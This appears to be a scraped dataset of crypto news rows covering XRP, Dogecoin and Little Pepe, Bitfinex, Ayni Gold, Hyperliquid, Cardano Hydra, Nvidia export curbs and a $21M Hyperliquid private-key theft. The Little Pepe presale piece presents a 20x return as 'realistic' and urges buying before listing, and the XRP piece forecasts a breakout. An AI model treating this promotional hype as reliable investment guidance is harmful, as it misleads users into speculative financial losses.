Yes, there are rare cases where a press release sparks inbound leads, but attribution is nearly impossible. In reality, it's usually the subsequent organic coverage, word of mouth, or community buzz that carries the real impact. A well-written article, strategic partnership, or exclusive pitch will almost always outperform a press release in creating tangible business opportunities. Conclusion: Purpose-Driven Deployment Press releases have evolved from main driver to niche tool with narrow but important applications. They excel at formal announcements requiring credibility, regulatory compliance, and establishing official records. They struggle with direct audience engagement, traffic generation, and relationship building where organic strategies prove far more effective. Are press releases still relevant? Yes, but success requires recognizing them as building blocks within integrated strategies – essential for compliance, crisis response, and major announcements, yet insufficient alone. As crypto PR specialists have noted, press releases can mark milestones and support SEO, but they cannot single-handedly build reputation or generate predictable leads. The most effective PR programs balance press releases' formal authority with thought leadership's relationship-building power, creating comprehensive approaches where each tactic plays to its unique strengths. Rather than declaring press releases dead or defending their dominance, modern communicators strategically deploy them where they deliver maximum value while investing heavily in the earned media relationships and authentic content that increasingly drive business results.",More News,EN,0,0,SPONSORED|BUSINESS|MARKET|RESEARCH|BLOCKCHAIN,"{'name': 'Crypto Daily', 'img': 'https://resources.cryptocompare.com/news/75/default.png', 'lang': 'EN'}",cryptodaily,2025-10-10 14:04:36

52944619,https://timestabloid.com/?p=85946,1760105145,https://resources.cryptocompare.com/news/67/default.png,When XRP Moves? Here’s Why Breakout Is Coming Sooner Than You Think,https://timestabloid.com/when-xrp-moves-heres-why-breakout-is-coming-sooner-than-you-think/,"A hush has settled across the XRP market — not the calm of apathy, but the poised stillness that often precedes a powerful move . For over two months, XRP’s price has compressed within a narrowing structure, suggesting that volatility is brewing beneath the surface. Traders and analysts are now turning their eyes to one critical question: when XRP moves, how explosive will the breakout be? The Calm Before the Storm Periods of sideways trading can be deceptive. To the untrained eye, they appear stagnant — a lack of excitement or direction. Experienced market observers see consolidation as a sign of pent-up energy. XRP’s recent price action fits this pattern , trading within a narrowing triangular range where highs and lows are converging. Technical analyst Cryptowzrd highlighted this setup in his recent post on X, noting that XRP has now been trading sideways for 75 days within a tightening triangle formation. Such formations rarely last indefinitely — they typically end with a breakout, either to the upside or downside. But in XRP’s case, the odds seem tilted toward a bullish resolution. WHEN XRP MOVES The breakout is coming sooner than you think.. $XRP has been trading sideways for 75 days in a Triangle, the range is getting tighter. A breakout above $3.05 can trigger a rally to the key $3.65 level XRP always rewards the patient.. pic.twitter.com/IuA6IhhOCs — CRYPTOWZRD (@cryptoWZRD_) October 9, 2025 The Key Level: $3.05 as the Trigger Point The price level $3.05 has emerged as the decisive resistance line that could unlock XRP’s next move. A breakout above this threshold, particularly on strong trading volume, could mark the start of a renewed uptrend. Market technicians see this as a “structure break,” one that could propel XRP toward the next major resistance zone near $3.65. Historical price data reinforces this view. Every time XRP has coiled within a long-term pattern like this, the eventual breakout has been both swift and sizable. The narrowing range signifies that buyers and sellers are reaching equilibrium — and that balance rarely lasts long in a market driven by momentum and sentiment. Momentum, Catalysts, and Market Sentiment Beyond chart patterns, several on-chain and macro indicators support the potential for an XRP rally. Accumulation data shows that wallet addresses holding medium-sized XRP balances have increased over the past few weeks — a sign of quiet accumulation rather than distribution. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 At the same time, broader crypto sentiment is shifting toward optimism, as Bitcoin and other top assets continue to hold higher support levels. This market-wide resilience could provide the tailwind XRP needs to break free from its compression zone. Patience Pays Off for XRP Holders As Cryptowzrd aptly put it, “XRP always rewards the patient.” Long-term holders understand this better than anyone. XRP’s past cycles indicate that when it breaks out after a long consolidation, the price movement can be sharp and rapid. Traders are currently focusing intently on the $3.05 level. A confirmed breakout could ignite a surge toward $3.65 and possibly beyond, but timing remains key. Until that moment comes, patience remains the most valuable strategy in the XRP playbook. The Bottom Line All signs point to an impending move for XRP. The technical compression, strengthening accumulation patterns, and improving market sentiment suggest that the breakout could arrive sooner than many anticipate . Whether this move begins in days or weeks, one thing is clear — when XRP finally moves, it won’t go unnoticed.

While Dogecoin remains the veteran in the space, Little Pepe is shaping up to be the bold new contender with considerable upside ahead. With a growing community, whale accumulation, and multiple giveaways, some analysts believe LILPEPE could soar as high as 20x from its current presale price, giving investors massive returns before 2025 wraps up. Dogecoin: The Original Meme Coin Dogecoin trades around $0.24 at the time of writing and continues to hold its place as the king of meme coins. Over the past few weeks, DOGE has maintained steady growth after renewed excitement around its ETF launch. The REX Osprey DOGE ETF, recently approved in the US, has brought institutional attention back to the token, signaling that Dogecoin is far from fading away. On the charts, DOGE has shown a rising pattern that many traders view as a bullish continuation signal. Analysts from TradingView and FXEmpire believe a move toward $0.35 or $0.40 is possible if momentum continues to build. Many people still consider Dogecoin a safe investment. However, for new investors, this maturity also limits the realistic upside it can deliver. With its large market cap, even a 5x move would require billions in new money, something much harder to achieve in the short term. Little Pepe: The Fresh Power Play While DOGE maintains its legacy, Little Pepe is quietly building the next wave of meme energy, backed by real infrastructure. The project is currently in presale stage 13, with tokens selling at $0.0022 each. Over $26.6 million has already been raised out of a $28.77 million goal, and the stage is nearly 94.5% sold out, indicating that investor interest is extremely high. Unlike many meme coins that rely on hype alone, Little Pepe is building on a Layer 2 network created specifically for meme tokens. This enables faster and cheaper transactions, while also incorporating sniper-bot resistance, which safeguards early buyers from whales attempting to dominate new launches. Adding a zero-tax trading model and a successful Certik audit makes it clear why investors are taking notice. Whale activity around LILPEPE has been growing steadily. Big presale buyers are competing in the Mega Giveaway, which rewards top buyers with over 15 ETH in prizes. Meanwhile, smaller investors are joining the $777K Giveaway, which already has over 434,500 entries, while the Mega Giveaway has attracted more than 75,800 participants. These campaigns have helped push Little Pepe to viral status across crypto communities and social media. The project has also shown cultural dominance. Between June and August this year, Little Pepe outperformed PEPE, DOGE, and SHIB in meme coin-related search trends. This indicates that curiosity is evolving into conviction among everyday traders seeking the next big breakout. Why Analysts Expect a 20x Upside With a zero starting market cap, LILPEPE offers a clean slate for massive growth. Analysts believe that when the token is listed on major exchanges, the influx of liquidity and increased exposure could easily drive prices up several multiples. At $0.0022, a 20x rise would bring the token to around $0.044, resulting in a $100 investment turning into $2,000. This is a realistic projection, given how quickly each presale stage has sold out and the fact that early investors from Stage 1 have already seen gains of over 120%. Once centralized exchange listings begin, and with community momentum already in full swing, Little Pepe could become one of the biggest breakout stories in crypto before the year ends. Conclusion Dogecoin remains a respected icon of meme culture, especially now with its ETF exposure and consistent adoption. But when it comes to growth potential, Little Pepe (LILPEPE) holds the edge. With its strong presale performance, whale accumulation, community-driven giveaways, and zero market cap advantage, it has everything needed to make 2025 a defining year. If projections hold, LILPEPE could deliver up to 20x returns from today’s presale price, turning even small investments into impressive gains. With the presale nearly sold out and listings already available, now might be the perfect time to join before it goes public.

52947571,https://blog.bitfinex.com/?p=26738,1760109477,https://resources.cryptocompare.com/news/99/default.png,How Does Bitfinex Help You Master Your Universe?,https://blog.bitfinex.com/uncategorized/how-does-bitfinex-help-you-master-your-universe/,"Bitfinex’s main priority, ever since its launch in 2012, has been to provide institutional and professional traders a technologically resilient, high performance trading platform that can operate in all market conditions. It’s an ambition that goes to the heart of what Bitfinex believes is the main requirement of professional traders to deploy successful strategies on the platform. With resiliency the key tenet underlying Bitfinex’s philosophy, it also chimes with the company’s other deep seated belief: that due to its near indestructible tech stack, the only asset that can withstand any economic conditions is Bitcoin. And that owning Bitcoin is the route to achieving financial independence and individual self-sovereignty. These twin beliefs are encapsulated by the Bitfinex campaign slogan: Master Your Universe . It is a play on the duality of what Bitfinex wants to achieve for its customers, in terms of the stability and resilience of the trading platform, as well as the call to action for everyone to learn about and own Bitcoin. Since 2012, Bitfinex has focused on building a secure and resilient platform that is anchored in Bitcoin’s philosophy of sovereignty and financial freedom, while continually expanding its infrastructure to support high-volume execution, deep liquidity, and precision trading. By combining its Bitcoin-first focus with Bitcoin-native features like the Lightning Network and RGB, as well as trading features, such as derivatives and robust fiat rails, Bitfinex empowers traders to navigate volatility, access global liquidity, and operate on their own terms. This makes Master Your Universe both a guiding principle and the lived experience of those who trade on Bitfinex. Why is Bitfinex The Exchange for Whales & Institutional Players? Since 2012, Bitfinex has embodied a dual mission, empowering traders to master their universe through professional-grade infrastructure while championing Bitcoin’s role as a tool for individual and collective financial freedom. To master your universe as a trader means having access to unmatched liquidity, precision execution, and a robust technological backbone designed for high-performance strategies across volatile markets. To master your universe as an individual or institution means embracing Bitcoin as a foundation for sovereignty: an open, permissionless financial system that returns control of money to those who earn it. These two dimensions define Bitfinex’s foundation as a platform that enables mastery not only over one’s trades, but over one’s economic destiny. From its earliest days, Bitfinex has stood as a Bitcoin-first exchange, guided by the belief that decentralised money can empower people, companies, and even nations to reclaim autonomy from the limitations of traditional finance. This conviction runs parallel to Bitfinex’s commitment to building tools for the world’s most demanding traders. Bitfinex’s infrastructure is engineered to give professionals an edge, deep liquidity across major pairs, low-latency execution, and sophisticated products that make high-volume, high-frequency, and cross-asset strategies seamless. Traders can design, test, and execute with confidence, while institutions integrate with advanced APIs, flexible funding markets, and derivatives offerings that meet the rigor of global capital deployment. Master Your Universe extends far beyond trading screens. It is also about enabling individuals to operate within a financial system built on freedom, autonomy, and resilience, which are values embodied by Bitcoin itself. Through its support of the Lightning Network, integration of tokenised assets, and leadership in Bitcoin-centric innovation, Bitfinex helps its customers to participate in a parallel economy that prioritises ownership and independence over reliance on intermediaries. Just as traders master markets through strategy and skill, everyday users can master their financial lives through Bitcoin and holding value securely, transacting globally, and opting out of systems that limit access or choice. Together, these twin philosophies of precision in trading and freedom through Bitcoin, form the core of Bitfinex’s identity. Whether you’re an institutional participant seeking performance at scale or an individual pursuing financial sovereignty, Bitfinex provides the platform to do both. Master Your Universe is not merely a statement about control, it’s a vision for empowerment, where market expertise and the liberating potential of Bitcoin converge to define a fairer, more open financial future. The 4 Pillars to Bitfinex’s Rock Solid “Built-on-Bitcoin” Foundation Master Your Universe is grounded in what Bitfinex calls the “four pillars”, which are the four essential underlying qualities which provide a solid foundation to the platform. These are trust, technology, liquidity, and advanced trading tools. Trust comes from our deep experience in the digital assets markets, ensuring that capital deployed on the platform is safeguarded even under extreme market stress. Technology underpins seamless trading, with low-latency execution, scalable infrastructure, and support for innovations like the Lightning Network. Liquidity provides the depth and stability that professional traders require, with tight spreads and deep order books that hold even in volatile conditions. Finally, advanced trading tools, derivatives, perpetual contracts, professional charting, lending, staking, and automated strategies, offer the flexibility to implement complex strategies. Each of these pillars contributes to giving traders the control necessary to “master” fast-moving markets. For professional traders and institutions, Bitfinex provides the precision tools required to command markets with confidence. Its low-latency matching engine, deep order books, and robust fiat gateways offer seamless access to liquidity and execution that remains stable even during extreme volatility. High-volume traders can execute large positions with minimal slippage, while institutions integrate effortlessly through programmable APIs, advanced funding markets, and customisable strategies. This architecture allows both individual and institutional participants to structure their activity according to their risk profiles and goals, whether managing complex portfolios, hedging exposure, or capitalising on emerging opportunities across the global digital asset ecosystem. At the same time, Master Your Universe extends beyond trading performance, it speaks to the broader empowerment that Bitcoin represents. As a Bitcoin-first platform, Bitfinex remains deeply committed to the principles of decentralisation, transparency, and self-custody. Bitcoin gives individuals, companies, and even countries the power to take control of their financial futures, free from censorship, capital controls, or inflationary pressures. Bitfinex makes Bitcoin available to its customers, helping them gain access to fast, borderless, and secure financial systems on their own terms. Bitfinex is both a platform for professionals to master markets and a gateway for traders to master financial freedom. Whether deploying institutional strategies or using Bitcoin to safeguard personal wealth, customers can find in Bitfinex a partner aligned with their pursuit of autonomy and control. Master Your Universe is not just a call to trade, it’s an invitation to participate in a parallel financial future, one built on resilience, opportunity, and the unyielding belief that freedom through Bitcoin and mastery through technology are two sides of the same coin. The Original Bitcoin Exchange Since 2012, Bitfinex has consistently identified as an exchange built by Bitcoiners for Bitcoiners. Unlike many platforms that integrated Bitcoin as one asset among many, Bitfinex’s origins are firmly tied to Bitcoin as the foundation of its philosophy and operations. This perspective has shaped its development over more than 12 years, guiding its approach to security, infrastructure, and customer empowerment. This belief is expressed in the Bitfinex Manifesto . By remaining focused on Bitcoin as a first principle, Bitfinex has sought to cultivate a platform aligned with the values of decentralisation, resilience, and individual sovereignty. Central to this philosophy is the view of Bitcoin as a tool for financial freedom. Bitcoin offers a way for individuals to hold and transfer value outside of traditional banking systems, bypassing the constraints of capital controls, inflationary pressures, and political interference. Bitfinex’s commitment to Bitcoin reflects a belief in enabling access to money that is borderless, permissionless, and resistant to censorship. This has meant prioritising features that strengthen Bitcoin’s usability, from early adoption of the Lightning Network to maintaining deep liquidity in BTC trading pairs. The focus is less about short-term trends and more about sustaining an infrastructure that upholds Bitcoin’s role as the backbone of digital finance. At the same time, Bitfinex has promoted the idea of building a freer and fairer parallel global economy through Bitcoin. By anchoring financial activity on a decentralised and transparent base layer, new models of commerce and investment can emerge outside legacy institutions. This parallel economy is envisioned as one where users are less reliant on intermediaries, where settlement is more efficient, and where individuals exercise greater control over their financial destiny. In this sense, Bitfinex views itself not just as a trading venue but as part of a broader project to strengthen Bitcoin’s role in enabling alternative economic systems. Bitfinex’s focus has always been on building an ecosystem where Bitcoin remains the foundation but where traders are equipped to explore a wider digital asset economy. By aligning with Bitcoin’s qualities of sovereignty and resilience, Bitfinex provides the stability that underpins its broader trading environment.

Tschinkel,https://cryptodaily.co.uk/2025/10/from-mine-to-blockchain-an-inside-look-at-ayni-gold-with-cto-daniel-c-tschinkel,"Gold has been on a remarkable run in 2025, steadily climbing through the summer and reaching new heights in September, with prices now hovering around $3,859 per ounce. This surge reflects a mix of persistent inflation, shifting interest-rate expectations, and continued central bank accumulation, underscoring gold’s enduring appeal as a safe-haven asset. Against this backdrop, Ayni Gold is bringing a fresh approach to gold mining, bridging traditional extraction with blockchain innovation. In an exclusive conversation, we speak with Daniel C. Tschinkel, CTO of Ayni Gold, about how the project tokenizes real-world gold production and what it means for investors looking to participate in this evolving market. CryptoDaily: Hi Daniel, it’s great to have you with us. So, tell us a bit about yourself — how did your journey in blockchain lead you to join Ayni Gold? Daniel C. Tschinkel: I have always been fascinated by how things work at their core. Since my younger days, I spent most of my time surrounded by computers — disassembling, experimenting, and putting them back together just to understand the essence of how everything connects. That curiosity naturally evolved into a deeper passion for technology and systems thinking. When I first discovered Bitcoin, I immediately felt the same pull. I needed to understand it from every angle — technically, economically, and philosophically — and that became my rabbit-hole moment. Daniel C. Tschinkel at European Blockchain Convention. Source: ayni.gold It started with mining. I built rig after rig, optimizing every setup to squeeze out more efficiency. Over time, my interest expanded to the broader blockchain ecosystem, especially when I realized how decentralized finance could completely reshape our financial infrastructure. After experiencing several market cycles — each one aging me about forty years in eight — I came to understand that the next major evolution in blockchain would be the tokenization of real-world assets. That is where Ayni Gold comes in. Having worked previously with one of the largest Bitcoin mining companies that successfully tokenized hashrate, I saw firsthand that almost anything tangible can be represented digitally. Ayni Gold represents that next step, bridging the physical world of gold mining with the digital economy, creating access for participants globally. For me, joining Ayni was about contributing to something meaningful — making real assets borderless and accessible through blockchain. I truly believe we are on the right path to achieving that vision. CD: That’s fascinating. You mentioned Bitcoin mining earlier — so how did the idea of tokenizing gold mining actually come about, and who do you see as the ideal participant for this project? Daniel C. Tschinkel: The idea really came from watching tokenization work successfully in other areas, especially in Bitcoin mining where hashrate was tokenized and fractionalized. That showed me that it is possible to take something complex and physical and make it accessible to a much broader audience through blockchain. Gold mining, in many ways, is a perfect fit for this approach because it is an asset people already understand and value. The commercial potential lies in opening a completely new way for people to participate in a traditionally closed market. Until now, access to mining profits or physical gold production was limited to high-net-worth individuals or institutional investors. Through Ayni Gold, we are changing that. This project is built for everyone — from individual miners who want exposure to gold through a transparent blockchain model, to funds looking for stable, asset-backed rewards in the digital space. At its core, Ayni Gold is about inclusion and financial equality. It is about giving people the opportunity to participate in something real and tangible, without the barriers that have always existed in traditional finance. That is where I see the true power and commercial potential of what we are building. CD: Interesting — given that context, why did you choose Peru, and what made Minerales San Hilario the right partner for this project? Daniel C. Tschinkel: Peru was an easy choice for us because it has one of the richest gold mining heritages in the world. The country is consistently among the top global producers of gold and has a long tradition of responsible mining operations supported by a well-established legal framework. Beyond its mineral wealth, Peru also offers stable mining infrastructure, skilled local labor, and a clear regulatory environment — all essential for building a sustainable and transparent operation. Minerales San Hilario, a licensed Peruvian concession holder, became our partner of choice because it already holds a valid gold mining concession in the region, secured in 2023. In many other tokenized mining projects, the biggest point of failure comes from relying on external operators. By operating directly via licensed concession, we remove that risk completely.

Tschinkel",https://bitzo.com/2025/10/exploring-the-innovation-of-blockchain-in-gold-mining-a-chat-with-ayni-golds-cto-daniel-c-tschinkel,"In the midst of this golden renaissance, Ayni Gold emerges as a beacon of innovation in the mining sector, integrating traditional gold mining with groundbreaking blockchain technology. Our exclusive interview with Daniel C. Tschinkel, CTO of Ayni Gold, sheds light on how the fusion of these industries is reshaping investor opportunities. Here’s what Daniel shared with us about his journey and the future of gold mining. Introduction to Daniel C. Tschinkel With a lifelong passion for technology, Daniel’s curiosity propelled him from tinkering with computers to embracing the complex world of blockchain. Exploring every facet of Bitcoin, he deepened his expertise in mining and decentralized finance. Daniel’s career evolution reflects a commitment to leveraging technology to transform traditional industries. The Convergence of Gold Mining and Blockchain Having witnessed the effective application of blockchain in Bitcoin mining, where hashrate was both tokenized and fractionalized, Daniel identified a natural progression to similar applications in gold mining. This sector, familiar and valued universally, presented a perfect candidate for blockchain enhancement. Through Ayni Gold , Daniel and his team are pioneering a model where physical gold mining operations are tokenized, thus democratizing access to gold mining profits. This model, highlighted in an informative article on CryptoDaily , allows individual investors and large funds alike to engage with gold mining in a transparent and innovative manner. Choosing Peru and Partnering with Minerales San Hilario Peru, a leader in global gold production with a robust mining heritage, was the optimal choice for Ayni Gold’s operations. The decision to partner with Minerales San Hilario was driven by their established, licensed status in the region, securing a stable and legal foundation for the project. With this strategic location and partnership, Ayni Gold not only ensures compliance and sustainability but also strengthens the bridge between the tangible world of gold and the digital realm of blockchain. The Vision for Ayni Gold Daniel’s vision for Ayni Gold revolves around inclusivity and financial equality, aiming to eliminate barriers in the traditional finance sector. By integrating real, tangible assets with blockchain technology, Ayni Gold is setting a precedent for future ventures in asset-backed digital currencies. This fusion of technology and tradition is not just a leap forward for mining; it represents a fundamental shift in how global assets are managed and accessed, pointing towards a more inclusive financial future.

CZ said he had little interaction with Jeff at the time and only learned about the connection earlier this year. “If you didn’t know, Jeff (Hyperliquid) was part of the YZiLabs (Binance Labs back then) incubation season 1 cohort in 2018. Unfortunately, that project failed. Hyperliquid’s Founder Once Part of Binance Incubator, CZ Confirms No Ongoing Ties YZiLabs did not recoup any of its investment,” CZ wrote. He added that YZiLabs holds no equity or tokens in Hyperliquid and emphasized that Binance supports all builders in the space. The post followed circulating photos from 2018 showing Jeff alongside other YZiLabs members, which fueled speculation of a deeper link between Hyperliquid and Binance. Jeff’s earlier project, Deaux, aimed to simplify decentralized prediction markets, an idea that later evolved into the foundation of Hyperliquid’s community-driven model. Hyperliquid , launched on its own layer-1 blockchain, has emerged as one of DeFi’s most active perpetuals trading platforms. In July 2025 alone, it processed about $319 billion in trading volume, according to DefiLlama data, the highest monthly figure since its launch. The surge contributed to a record $487 billion in total DeFi perpetuals volume that month. Built entirely on-chain, Hyperliquid operates through two tightly linked components: HyperCore, which handles order books, margin, and liquidations; and HyperEVM, a smart-contract layer sharing consensus and data with the exchange core. Its HotStuff-based HyperBFT consensus enables sub-second trade execution, achieving median latency of just 0.2 seconds, performance that rivals centralized exchanges. The platform’s structure diverges from the automated market maker model that dominates most decentralized exchanges. Instead, it maintains on-chain order books and matching systems, combining transparency with the speed typically seen in centralized venues. Hyperliquid’s core team is believed to consist of just 11 members. Founder Jeff Yan has described the project as self-funded, rejecting venture capital to maintain independence and community alignment. The team’s rapid response to outages, including a July incident that led to $1.99 million in trader reimbursements within a day, has drawn attention to its tight operational discipline. While CZ clarified that Binance has no financial stake in Hyperliquid, his comments shed light on the shared history between Binance Labs’ early incubation efforts and the builders now leading some of DeFi’s most prominent projects. Hyperliquid Emerges as Binance’s Strongest Decentralized Challenger Decentralized exchange Hyperliquid has continued to erode Binance’s dominance in crypto derivatives trading, with its trading activity now reaching 13.6% of Binance’s volume, up from 8% at the start of the year. The shift highlights how decentralized perpetual futures platforms are gaining traction as viable alternatives to centralized exchanges. Hyperliquid has processed over $200 billion in recent months, driven by new cross-chain features that support assets across multiple blockchains, including Bitcoin. The exchange now holds roughly 70% of the total decentralized perpetuals market, according to DeFiLlama and Token Terminal data . Its native token, HYPE, recently hit an all-time high of $59.29, bringing its market cap close to $16 billion. The rise of decentralized perpetual exchanges (perp DEXs) has been rapid. Combined trading volume across the sector reached $1.22 trillion in September, a 48% jump from August. Much of that activity came from Hyperliquid and Aster , a new derivatives DEX launched by YZi Labs , a firm linked to former Binance CEO Changpeng Zhao. Perp DEXs hit $1 trillion monthly volume for the first time as Aster and Hyperliquid lead a surge challenging centralized exchange dominance. #Perps #Dexs https://t.co/rDhsLASOLf — Cryptonews.com (@cryptonews) October 2, 2025 Aster has quickly climbed the ranks, posting nearly $494 billion in monthly volume and generating over $120 million in fees within a week. Despite Binance’s still-dominant $83 billion in daily futures volume, the gap between centralized and decentralized platforms is narrowing. Analysts say Hyperliquid’s consistent liquidity and Aster’s rapid rise signal a structural shift in derivatives trading, as traders increasingly favor decentralized, transparent, and non-custodial venues.

In a brief comment on X, Cardano founder Charles Hoskinson struck an upbeat tone about the near-term trajectory: “Hydra is going to have an awesome 2026,” he wrote, amplifying a community post that framed the upgrade as a step-change for throughput-sensitive use cases. Cardano’s Hydra Node V1.0 Is Live The release notes , published under the “A big release of hydra-node! It’s official. We’re at version 1.0.0!” banner, emphasize that the team intends to “continue to support [the] Hydra Head protocol implementation into production environments,” even as they continue work on the “largest outstanding known problem,” partial fanout. Crucially, the tag itself is marked “Pre-release” on GitHub—an important nuance for developers and integrators who follow semantic signals from the repository. At a technical level, v1.0.0 consolidates months of incremental changes into a package that’s been tested with cardano-node 10.1.2 and cardano-cli 10.1.1.0. The build introduces a beta of incremental commits, allowing funds to be committed to a running Head; adds a –deposit-deadline parameter so operators can define how long a node should watch for deposits before enabling safe recovery; and rewrites the commit and initial scripts in Aiken, moving the initial script to Plutus V3 and shrinking it by 1,337 bytes. One consequential trade-off appears in the commit-path rewrite: the documented maximum number of Head participants is now eight. The release also notes API refinements (for example, a POST /transaction endpoint) and persistence format changes tied to more efficient snapshot handling. For builders, these specifics matter because Hydra’s promise has always been pragmatic rather than purely theoretical: execute fast, low-cost transactions off-chain inside a Head while preserving Cardano’s extended-UTXO semantics, then fan the final state back to L1. The Hydra Head protocol has been mainnet-compatible since v0.10.0, but the v1.0.0 tag signals a harder push toward real-world deployment across DeFi , gaming, and latency-sensitive apps—precisely the domains community voices highlighted in today’s discourse. As one KOL put it in a widely shared post, “Cardano just entered a new era of speed and scalability. Hydra Node v1.0.0 is here — DeFi, gaming, and real-time apps are about to level up.” While the release notes are measured, the throughput optics behind Hydra are anything but. In prior public stress tests tied to the community’s Hydra Doom project and its CPLAY summit finale, Input Output recorded Hydra hitting 1 million transactions per second . That figure was presented as a demonstration of how off-chain Hydra Heads can absorb extreme, frame-by-frame game state updates without interrupting service—useful for real-time interactive apps and high-fan-out venues. “We proved that Hydra can scale to 1 million TPS,” Hoskinson said in the company’s recap of the event. Beneath the headline peak, telemetry circulating during the qualifier rounds showed sustained readings in the hundreds of thousands of TPS, with community dashboards and posts commonly citing plateaus around ~650,000 TPS before the Las Vegas finale pushed beyond the seven-figure mark.

The Jensen Huang-led firm continues to be at the epicenter of the trade dispute between Washington and Beijing as its AI chips now face tightening restrictions from both sides. China has increased its restrictions on imports of U.S. semiconductors, including Nvidia’s artificial intelligence chips, according to a report from the Financial Times. Reportedly, Chinese customs authorities have dispatched officials to major ports to conduct strict inspections on semiconductor shipments. The initial focus was on Nvidia’s H20 and RTX Pro 6000D chips, but the focus has expanded to include all advanced processors that might breach Washington’s restrictions. The availability of Nvidia’s cutting-edge AI chips has been a long-standing source of friction between Beijing and Washington. U.S. export restrictions limit the sale of high-performance processors to China due to concerns about national security and military concerns. In response, Beijing has attempted to reduce its reliance on foreign suppliers and increase domestic semiconductor production. Beijing intensifies restrictions on U.S. chips and semiconductor imports Despite Beijing’s efforts, more than $1B worth of Nvidia’s high-end chips were smuggled and resold in China between May and August. Nvidia’s RTX6000D chip, which is tailored for the Chinese market to comply with American regulations, has reportedly seen a decline in interest, as major Chinese tech firms are hesitant to place large orders due to uncertainty over future restrictions. China’s regulators have previously accused Nvidia of anti-competitive behavior and instructed domestic firms to halt purchases of its AI processors. Despite significant progress by domestic manufacturers such as Huawei, engineers in China say Nvidia’s chips still outperform domestic alternatives. In August, President Trump hinted at easing restrictions to allow Nvidia to sell more advanced chips in China. But with Beijing intensifying inspection and tightening export controls, all those efforts might not have much of an impact. Trade tensions ahead of Xi–Trump meeting Beijing’s increased inspection of Nvidia’s chips comes just weeks before Xi and Trump are expected to meet on the sidelines of the Asia-Pacific Economic Cooperation (APEC) summit in South Korea’s Gyeongju. The summit follows months of tense negotiations between the two countries, which have been struggling to move beyond their current 90-day tariff truce set to expire on November 9. Beijing has been increasing its export restrictions in order to strengthen its leverage in talks with Washington. On October 9, it added five new elements to its export control list and imposed curbs on artificial diamonds and graphite anode materials, which are both critical components in semiconductors and quantum devices. The measures are set to take effect on November 8, one day before the truce ends. As the world’s largest producer of rare earth minerals, China has been tightening its grip over the supply of materials essential to global manufacturing of electronics, batteries, and defense systems. Its earlier export controls announced in April triggered temporary shortages in the U.S. and Europe before later deals helped ease the disruptions. Both countries have traded tariffs exceeding 100% on goods ranging from agricultural products to automobiles. Chinese officials have repeatedly urged the U.S. to lift curbs that they say unfairly constrain its economy. Both countries also have geopolitical tensions as Beijing is urging Washington to adopt a firmer stance against Taiwan’s independence rather than the ambiguous position it currently holds.

Blockchain security specialists at PeckShield tracked the movement of stolen assets through on-chain analysis, revealing that the attackers quickly moved to transfer the compromised funds to the Ethereum network. The stolen haul included approximately 17.75 million DAI tokens and 3.11 million MSYRUPUSDP tokens. PeckShield’s investigation included visual evidence in the form of screenshots that map out various wallet addresses implicated in the theft. #PeckShieldAlert A victim 0x0cdC…E955 lost ~$21M worth of cryptos on #Hyperliquid due to a private key leak.

This methodology closely mirrors the tactics employed by cybercriminals in previous high-profile cryptocurrency thefts. $16M Long Trade Close Links to the Hyperliquid Private Key Breach A mysterious aspect of the hacking incident involves the timing of certain trading activities. Precisely when PeckShield issued its initial alert about the breach, trading records show that a Hyperliquid account executed a closure of a HYPE long position valued at $16 million. Source: Hypurrscan This same account also liquidated 100,000 HYPE coins, converting them into $4.4 million. Researchers at MLM conducted an analysis of transaction records from Hypurrscan and have put forward the theory that this trading account likely belongs to the compromised user. Their reasoning centers on the observation that these newly acquired assets were converted into the stablecoins USDC and DAI, then dispersed across numerous wallet addresses spanning both the Ethereum and Arbitrum blockchain networks. This transaction pattern correlates closely with the movement data that PeckShield documented through Etherscan . The scope of the attack wasn’t limited to assets held directly on the Hyperliquid platform. Investigation findings reveal that the attacker also successfully extracted $3.1 million from the Plasma Syrup Vault liquidity pool. Source: Etherscan These funds, denominated in MSYRUPUSDP tokens, were immediately relocated to a freshly created wallet address. Luke Cannon, a prominent voice on X (formerly Twitter), has suggested that the victim’s losses may be even more extensive. According to Cannon’s analysis , an additional $300,000 may have been drained from associated wallet addresses that the hacker managed to compromise. Similar Hacking Incidents On Hyperliquid Paint a Troubling Picture Another Hyperliquid user shared that he lost $700k in HYPE in a similar incident last month. According to him, he’s not sure how he was hacked, “No malware, no discord chats, no TG calls, no email download,” he added. Lost 700k in hype in a similar incident last month. Not sure how they hacked. No malware, no discord chats, no TG calls, no email download. — BRVX (@TradeThreads) October 9, 2025 He believes the hack was most likely achieved through Windows malware, as he hadn’t touched crypto wallets in a week prior to the hack and had gotten a new MacBook, too, but the wallet wasn’t set up on it. Unlike smart contract bugs or exchange exploits, this attack happened because of a private key leak. That means the attacker gained direct access to the wallet’s login credentials. Such leaks often occur due to phishing links, malware, or unsafe key storage. Security experts have long warned that high-value accounts should always use cold wallets or multi-signature protection to prevent such incidents. Blockstream issued an urgent security alert warning users about a sophisticated phishing campaign targeting Jade hardware wallet owners through fake firmware update emails. #Phishing #Crypto https://t.co/QQMYA4Ezrm — Cryptonews.com (@cryptonews) September 13, 2025 But it seems users continue to fall victim to these exploits. A Pattern of Private Key Breaches Just a few weeks ago, SFUND, the official token of Seedify, plummeted by 99% after North Korean hackers extracted $1.2 million from the DAO launchpad by gaining access to a Seedify developer’s private keys. Similarly, in September, a user of the Venus lending protocol on BNB Chain lost assets worth about $27 million due to a private key breach . According to a report by blockchain security firm CertiK, last year alone saw a loss of $2.36 billion in total across 760 on-chain security incidents. A whopping $1.05 billion was lost to private key breaches through over 296 incidents, accounting for 39% of the total number of attacks suffered in crypto. Source: Certik Private key breach through phishing is popular due to its simplicity and effectiveness, the report says. It is less about technological defenses and more about human vulnerability. Blockchain transactions make phishing “particularly devastating” as they are irreversible. It’s also observed that Ethereum saw the most security incidents overall, with 403 of the total 760 hacks , scams, and exploits, followed by Binance Smart Chain (BSC), the second-most targeted chain when it comes to phishing scams. Source: Certik But now it seems Hyperliquid, as a result of its decentralized nature, is also getting into the mix for hackers and bad actors.

